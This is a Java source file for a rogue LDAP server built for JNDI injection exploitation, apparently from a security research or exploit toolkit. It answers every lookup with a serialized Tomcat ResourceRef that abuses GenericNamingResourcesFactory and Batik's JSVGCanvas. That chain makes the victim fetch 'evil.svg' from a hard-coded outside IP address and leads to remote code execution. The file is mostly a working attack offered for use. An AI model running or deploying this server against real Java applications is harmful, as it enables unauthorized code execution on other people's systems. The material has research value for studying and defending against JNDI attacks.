package cn.org.unk.JNDI;

import cn.org.unk.Util;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAPObjectFactoryServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    private int port;
    private String codeBase; // http://127.0.0.1:8000/#WinCalc

    public LDAPObjectFactoryServer(int port, String codeBase) {
        this.port = port;
        this.codeBase = codeBase;
    }

    public void run () {

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(codeBase)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {

            System.out.println(this.getClass().getName() + "sendResult start.....");

            ResourceRef resourceRef = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "", true,
                    "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
            resourceRef.add(new StringRefAddr("URI", "http://120.76.118.202:17979/evil.svg"));

            Entry entry = new Entry(base);
            entry.addAttribute("javaClassName", "java.lang.Class");
            try {
                entry.addAttribute("javaSerializedData", Util.serialize(resourceRef));
            } catch (Exception ex) {
                throw new RuntimeException(ex);
            }
            try {
                result.sendSearchEntry(entry);
            } catch (LDAPException ee) {
                throw new RuntimeException(ee);
            }
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
